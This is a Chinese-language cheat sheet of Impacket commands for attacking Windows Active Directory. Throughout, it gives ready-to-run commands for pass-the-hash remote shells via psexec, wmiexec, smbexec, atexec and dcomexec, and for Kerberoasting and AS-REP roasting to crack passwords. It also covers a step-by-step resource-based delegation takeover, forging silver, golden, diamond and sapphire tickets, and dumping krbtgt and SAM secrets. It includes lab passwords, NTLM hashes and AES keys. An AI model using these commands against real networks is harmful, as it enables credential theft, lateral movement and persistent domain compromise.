###############################   Impacket脚本使用示例    ############################

两个使用方式:
#python 脚本形式
python psexec.py 192.168.1.48

#python 库形式,需要安装
impacket-pesexec 192.168.1.48


通过选项:
#hash认证
pyhton xxx.py domain/user@ip -hashes :a28993c1747c6265afe792ed7d037373

#kerberos认证
export KRB5CCNAME=ad01.ccache
python xxx.py -k -no-pass

#指定目标IP
-target-ip 192.168.1.53

#指定域控
-dc-ip 192.168.1.53


psexec.py 使用示例:
#可使用 密码认证 hash认证 kerberos认证
#交互式shell  域用户
python psexec.py momoda/administrator:'ZCxq&95271&123'@192.168.1.53  #特殊符号密码用引号扩起来

#交互式shell  主机用户
python psexec.py win2008host:MOmoda95271@192.168.1.53

#执行单命令
python psexec.py win2008host:MOmoda95271@192.168.1.53 whoami /all
#会乱码 936 编码
python psexec.py win2008host@192.168.1.53 whoami /all -codec 936 
-hashes :e081020a8c3987114b3667ec95f08e9f  #-hashes  在最后

#  * LM       : 6ee1debc4cea715ec1903373c5469a2a
#  * NTLM     : e081020a8c3987114b3667ec95f08e9f
#  * SHA1     : ec689e168619b6ba756a89795a59e0f52f93c2c5

#利用密码HASH执行   只有 NTLM hash 可以登录
python psexec.py win2008host@192.168.1.53 -hashes :e081020a8c3987114b3667ec95f08e9f

# -port   指定目标SMB的端口
# -codec  codec目标回显的编码 可先执行chcp.com拿到回显编码
# -service-name   指定创建服务的名称，默认随机
# -remote-binary-name     指定上传文件的名称，默认随机

#上传文件并执行
python psexec.py win2008host:MOmoda95271@192.168.1.53 "/c 1+1" -remote-binary-name test.exe
-codec 936 -path C:\\windows\\temp\\ -c p.exe -hashes :e081020a8c3987114b3667ec95f08e9f


smbexec.py 使用示例:
#可使用 密码认证 hash认证 kerberos认证
python smbexec.py win2008host:MOmoda95271@192.168.1.53

# -share      自定义回显的共享路径 默认为C$
# -mode       设置SHARE回显或者SERVER回显  SERVER回显需要 linux  root下执行
# -shell-type 设置返回的shell类型

atexec.py 使用示例:
#可使用 密码认证 hash认证 kerberos认证
python atexec.py win2008host:MOmoda95271@192.168.1.53 whoami /all -codec 936

# -session-id     使用登录的SESSION运行  无回显 不会主动调用cmd 如silentcommand
# -silentcommand  不运行cmd.exe 直接运行命令

wmiexec.py 使用示例:
#可使用 密码认证 hash认证 kerberos认证
python wmiexec.py win2008host:MOmoda95271@192.168.1.53 whoami /all

# -share      设置连接的共享路径 默认 ADMIN$
# -nootuput   不获取输出 没有SMB连接
# -silentcommand  不运行cmd.exe 直接运行命令
# -shell-type {cmd | powershell}  设置返回的shell类型
# -com-version  MAJOR_VERSION | MINOR_VERSION  设置DCOM版本

dcomexec.py 使用示例:
#可使用 密码认证  hash认证  kerberos认证
#一般使用MMC20 而且DCOM有时候会遇到0x800706ba的错误  一般都是防火墙拦截
python dcomexec.py -object MMC20 win2008host:MOmoda95271@192.168.1.53

# -share    设置连接的共享路径 默认AMDIN$
# -nooutput 不获取输出 没有SMB连接
# -object  {ShellWindows | ShellBrowserWindow | MMC20}  设置RCE利用的类型
# -com-version MAJOR_VERSION | MINOR_VERSION 设置DCOM版本
# -shell-type {cmd,powershell}  设置返回的shell类型
# -silentcommand  不运行cmd.exe 直接运行命令

Kerberos协议:
#10.30.30.128  域控

getTGT.py 使用示例:
#可使用密码认证  hash认证  kerberos认证
#通过认证后去DC 请求TGT并保存

#获取administrator用户的TGT  TGT过期前可拿来获取其权限
python GetTGT.py momoda/administrator:'ZCxq&95271&123' -dc-ip 10.30.30.128

getST.py 使用示例:
#可使用密码认证  hash认证  kerberos认证
#听过认证后去DC请求ST并保存

#用administrator的权限获取AD01.test.com的cifs服务的服务票据 ST
python getST.py  momoda/administrator:'ZCxq&95271&123' -dc-ip 192.168.1.53 -spn
cifs/AD01.test.com

# -impersonate IMPERSONATE  模拟为指定的用户权限
# -additional-ticket ticket.ccache  在委派的S4U2Proxy中添加一个可转发的服务票据
# -force-forwardable  通过CVE-2020-17049强制忽略校验票据是否可转发
# -spn  指定请求服务的 目标

getPac.py 使用示例:
#可使用密码认证 hash认证

#查询test用户的PAC  可以看到登录次数  密码错误次数之类的
python getPac.py  momoda/administrator:'ZCxq&95271&123' -targetUser test

GetUserSPNs.py 使用示例:
#可使用密码认证 hash认证  kerberos认证

#查询test.com中的用户的SPN有那些  只需要任意一个域用户即可利用
#只要有用户的SPN可以请求  可以获取TGS爆破密码
python GetUserSPNs.py momoda/administrator:'ZCxq&95271&123' -target-domain momoda

# -request    请求所以用户的SPN的TGS  可拿来爆破用户密码
# -request-user   请求指定用户的TGS
# -usersfile    请求指定文件内所有用户TGS

GetNPUsers.py 使用示例:
#可使用密码认证 hash认证  kerberos认证

#查询域内那些用户不需要kerberos预身份认证 只需要任意一个域用户即可利用
#只要有用户不需要kerberos预身份认证 可以获取其AS_REQ拿来爆破其密码
python GetNPUsers.py momoda/starchen1:ZCxq95271##

# -request    请求不需要kerberos预身份认证用户的TGT  可拿来爆破
# -format {hashcat | join}  设置AS_REQ的爆破格式  默认hashcat
# -usersfile  请求指定文件所有用户的TGT
# -outputfile 向指定的文件输出结果

rbcd.py 使用示例:
#可使用密码认证 hash认证  kerberos认证

# rbcd这个脚本适合于已经有了一个域用户 然后发现该用户对目标机器的msDS-AllowedToActOnBehalfOfOtherIdentity
# 属性有写权限 例如GenericAll就包含此子权限

# 此时通过该域用户创建一个机器账户加入域，就能将机器账户的SID写入目标机器的属性中。从而让机器账户可以在目标机器上
# 通过委派模拟为任意用户的权限。

#使用test用户，向WIN-7$的msDS-AllowedToActOnBehalfOfOtherIdentity属性写入test_computer$的SID
python rbcd.py -delegate-to WIN-7$ -delegate-from test_computer$ -dc-ip 192.168.40.140 
test/test:1qaz@WSX -action write

# -action {read | write | remote | flush} 选择要对特殊属性进行的操作 可选读取、写入、删除
# -use-ldaps 使用LDAPS协议替换LDAP

rbcd.py 完整利用示例:
# 比如，此时我在域中拥有一个普通用户test:1qaz@WSX，通过ACL发现test对WIN-7具有msDS-AllowedToActOnBe
# halfOfOtherIdentity的写权限。
# 所以我先通过test添加一个computer，test_computer$:1qaz@WSX，命令如下：
python addcomputer.py test.com/test:1qaz@WSX -computer-name test_computer$ -computer-pass 1qaz@WSX

# 然后通过test用户和rbcd.py脚本给WIN-7设置属性。将WIN-7$的msDS-AllowedToActOnBehalfOfOtherI
# dentity属性指向test_computer$
python rbcd.py -delegate-to WIN-7$ -delegate-from test_computer$ -dc-ip 192.168.40.140 test/tes
t:1qaz@WSX -action write

# 设置好属性后，使用getST.py获取到administrator的cifs/WIN-7的服务票据（ST）
python .\getST.py -spn 'cifs/WIN-7' -impersonate administrator -dc-ip 192.168.40.140 'test/tes
t_computer$:1qaz@WSX'

# 将生成的适合Linux使用的ccache格式转换为Windows的kirbi
python .\ticketConverter.py .\administrator.ccache .\administrator.kirbi

# 通过mimikatz加载票据
kerberos::ptt C:\Python38\Scripts\administrator.kirbi

# 此时即可正式利用，可通过klist查看票据确实注入了。然后直接对目标的cifs进行dir操作，
# 或通过psexec等横向手法横向即可。如下图所示：
c:\windows\system32\klist

#当前登录 ID 是。。。

无MAQ时的新利用方式:
# 当用户具有A机器的写权限，但是无法新建机器利用rbcd，且当前用户没有可用的SPN时，可以使用该技术。该技术还未并入主进程。

# 使用UPN替代SPN进行rbcd。流程如下：

# 用test用户的权限请求模拟administrator用户的服务票据，仅在rbcd情况下有效。且获取TGT后要将TGT的Sessionkey改为
# test的hash。否则TGS无法解密

#请求test/test用户的TGT
getTGT.py -hashes :$(pypykatz crypto nt 'password') test/test

#查看TGT里面的Ticket Session Key
describeTicket.py 'TGT.ccache' | grep 'Ticket Session Key'

#将test/test用户的hash改为TGTSessionKey
smbpasswd.py -newhashes :TGTSessionKey test/test:'password'@'dc01'

#通过委派模拟为administrator用户
KRBR5CCNAME='TGT.ccache'
getST.py -u2u -impersonate Administrator -k -no-pass test/test

#还原test/test用户的hash
smbpasswd.py -hashes :TGTSessionKey -newhashes :OldNTHash test/test@'dc01'

# 参考资料：
# https://github.com/GhostPack/Rubeus/pull/137

ticketConverter.py  使用示例:
# 不需要认证 因为这个脚本是在ccache和kirbi格式中互相转换用的脚本。

# 将ccache转换为kirbi，交换位置就是kirbi转换为ccache
python ticketConverter.py .\administrator.ccache .\administrator.kirbi

ticketer.py 使用示例:
# 可使用密码认证、hash认证
# 这个脚本主要拿来伪造各种服务票据，例如银票据、金票据、钻石票据、蓝宝石票据。
# 注意2021年11月更新之后，如果用户名在AD域中不存在，则票据会被拒绝。

白银票据伪造:
# 银票因为不需要与DC通信，所以比金票更加隐蔽。但是银票只能对伪造的服务有效，且会随着
# 服务账户密码的修改而失效。

# 使用win-7$的机器账户的hash96dd976cc094ca1ddb2f06476fb61eb6伪造cifs/win-7的服务
# 票据，使用票据的用户是根本不存在的qqq或者存在的任意用户。
python .\ticketer.py -spn cifs/win-7 -domain-sid S-1-5-21-2799988422-225
7142125-1453840996 -domain test.com -nthash 96dd976cc094ca1ddb2f06476fb61eb6 qqq

黄金票据伪造:
# 使用krbtgt的密钥伪造TGT中的PAC的权限，证明任意用户属于特权组。然后通过伪造了PAC的TGT换ST，从
# 而获得任意服务的权限。金票据因为需要和DC进行交互，所以建议在域内使用，域外通过代理使用有时候会换不到ST。

# 注意金票会随着krbtgt密码的修改而失效

# 在银票的命令基础上去掉-spn，将nthash修改为krbtgt的hash即可。
py -3 .\ticketer.py -domain-sid S-1-5-21-2799988422-2257142125-1453840996 -domain test.c
om -nthash 96dd976cc094ca1ddb2f06476fb61eb6 qqq

钻石票据伪造:
# 由于金票据和银票据没有合法的KRB_AS_REQ或KRB_TGS_REG请求，所以会被发现。而钻石票据会正常请求票
# 据，然后解密票据的PAC，修改并重新加密。从而增加了隐蔽性。

# aesKey是krbtgt的密钥，注意一般aesKey都是256位加密的，这个得看DC的算法。不过128也建议存一份吧

# -user-id和-groups是可选的，如果不选分别会默认500和513, 512, 520, 518, 519

# -user和-password是要真实去发起TGT请求的用户的账密，可使用hash。这个用户实际上是什么权限不重要
py -3 ticketer.py -request -domain test.com -domain-sid S-1-5-21-2799988422-22
57142125-1453840996 -user administrator -password 1qaz@WSX -aesKey 245a674a4
34726c081385a3e2b33b62397e9b5fd7d02a613212c7407b9f13b41 -user-id 1500 -grou
ps 12,513,518,519,520 qqq

蓝宝石票据伪造:
# 钻石票据是伪造的PAC特权，但是蓝宝石票据是将真实高权限用户的PAC替换到低权限的TGT中，从而成为目前最难检测的手法

# 不过该技术还是impacket的一个分支，正在等待合并。

# 注意，因脚本问题，未复现成功
py -3 ticketer_imper.py -request -domain test.com -domain-sid S-1-5-21-2799988422-22
57142125-1453840996 -user administrator -password 1qaz@WSX -aesKey 245a674a434726c081
385a3e2b33b62397e9b5fd7d02a613212c7407b9f13b41 -impersonate administrator qqq
# 参考：
# https://github.com/SecureAuthCorp/impacket/pull/1411

# -spn SPN 银票用，一般都是某个服务器的cifs或DC的ldap服务，mssql啥的也可以考虑
# -request 要求请求TGT，这个脚本里可以理解为钻石票据伪造。必须同时存在-user和-password
# -aesKey hex key 用来签名票据的krbtgt的AES加密的密码
# -nthash NTHASH  用来签名票据的krbtgt的NTLM加密的密码
# -keytab KEYTAB 请求文件内容中的多个银票据
# -duration DURATION 修改票据的失效时间
# -user-id USER_ID 指定伪造PAC的用户权限ID,默认是500 管理员
# -groups GROUPS 指定伪造PAC的组权限ID，默认是513, 512, 520, 518, 519这五个组

raiseChild.py  使用示例:
py -3 raiseChild.py childDomain.net/adminuser:mypwd


Windows密码:
secretsdump.py 使用示例:
# 基于NTLM认证，使用机器用户导出
py -3 secretsdump.py -hashes 5f8506740ed68996ffd4e5cf80cb5174:5f8506740ed68996ffd4e5
cf80cb5174 "domain/DC\$@DCIP" -just-dc-user krbtgt

# 基于Kerberos票据导出
export KRB5CCNAME=ad01.ccache 
py -3 secretsdump.py -k -no-pass AD01.test.com -dc-ip 192.168.111.146 -targe
t-ip 192.168.111.146 -just-dc-user krbtgt

# 本地解密SAM
py -3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

# -system SYSTEM SYSTEM文件
# -security SECURITY security文件
# -sam SAM SAM文件
# -ntds NTDS NTDS.DIT文件
# -resumefile RESUMEFILE 待恢复的NTDS.DIT转储文件
# -outputfile OUTPUTFILE 输出的文件名
# -use-vss 使用vss卷影替代DRSUAPI
# -rodcNo RODCNO Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach)
# -rodcKey RODCKEY AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach)
# -use-keylist 使用KerberosKeyList转储TGS-REQ
# -exec-method [{smbexec,wmiexec,mmcexec}] 使用vss卷影导出时执行命令的方法，分别有smbexec、wmiexec、mmcexec

mimikatz.py  使用示例:
# 这是一个比较鸡肋的功能，需要先在目标机器上用mimikatz执行rpc::server
# 然后用该脚本进行连接
py -3 .\mimikatz.py test.com/administrator:1qaz@WSX@192.168.40.158
